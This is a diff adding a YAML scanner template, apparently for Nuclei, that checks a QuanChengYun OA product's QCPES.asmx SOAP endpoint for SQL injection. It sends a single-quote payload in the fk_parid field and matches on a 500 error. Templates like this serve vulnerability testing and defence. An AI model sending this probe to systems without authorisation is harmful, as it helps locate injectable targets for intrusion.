@@ -1,0 +1,32 @@
+
+id: quanchengyun-qcpes-sqli
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /OA/PES/QCPES.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: close
+        Content-Type: text/xml; charset=utf-8
+        Soapaction: "http://tempuri.org/GetCode"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+            <GetCode xmlns="http://tempuri.org/GetCode">
+            <fk_parid>112'</fk_parid>
+                <value>1</value>
+            </GetCode>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==500 && contains_all(body,"PES.QCPES.GetCode")
